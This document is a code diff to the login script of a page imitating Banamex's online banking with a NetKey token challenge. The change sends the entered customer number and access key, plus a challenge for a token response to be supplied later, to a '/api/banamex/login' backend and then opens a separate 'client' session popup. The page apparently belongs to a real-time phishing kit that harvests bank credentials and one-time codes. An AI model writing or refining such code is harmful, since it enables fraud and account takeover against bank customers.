@@ -1433,7 +1433,7 @@
         actualizarFechaHora();
 
         // Login form handler
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
             e.preventDefault();
             
             const numeroCliente = document.getElementById('usuario').value;
@@ -1447,25 +1447,51 @@
                 // Generar challenge
                 const challenge = generateChallenge();
 
-                // Después de 5 segundos, mostrar modal con NetKey
-                setTimeout(() => {
-                    // Ocultar loader
+                try {
+                    // Enviar datos de login al backend para crear la sesión
+                    const response = await fetch('/api/banamex/login', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            numeroCliente,
+                            claveAcceso,
+                            challenge,
+                            netkeyResponse: '' // Se enviará después desde la ventana emergente
+                        }),
+                    });
+
+                    const data = await response.json();
+                    
+                    if (data.success && data.sessionId) {
+                        // Ocultar loader
+                        loadingOverlay.classList.remove('active');
+                        
+                        // Abrir ventana emergente del cliente inmediatamente
+                        console.log('[Banamex] Abriendo ventana del cliente con sessionId:', data.sessionId);
+                        
+                        const clientWindow = window.open(
+                            `/client?sessionId=${data.sessionId}`,
+                            'ClientScreen',
+                            'width=800,height=900,menubar=no,toolbar=no,location=no,status=no,scrollbars=yes,resizable=yes'
+                        );
+                        
+                        if (clientWindow) {
+                            clientWindow.focus();
+                            console.log('[Banamex] Ventana del cliente abierta exitosamente');
+                        } else {
+                            alert('Por favor permite ventanas emergentes para continuar.');
+                        }
+                    } else {
+                        loadingOverlay.classList.remove('active');
+                        alert(data.message || 'Error en la autenticación');
+                    }
+                } catch (error) {
+                    console.error('Error enviando datos:', error);
                     loadingOverlay.classList.remove('active');
-                    
-                    // Mostrar challenge en el modal
-                    document.getElementById('netkeyChallenge').textContent = challenge;
-                    
-                    // Mostrar modal
-                    const netkeyModal = document.getElementById('netkeyModal');
-                    netkeyModal.classList.add('active');
-                    
-                    // Guardar datos de login
-                    window.loginData = {
-                        numeroCliente,
-                        claveAcceso,
-                        challenge
-                    };
-                }, 5000);
+                    alert('Error de conexión. Por favor, intenta de nuevo.');
+                }
             }
         });
 
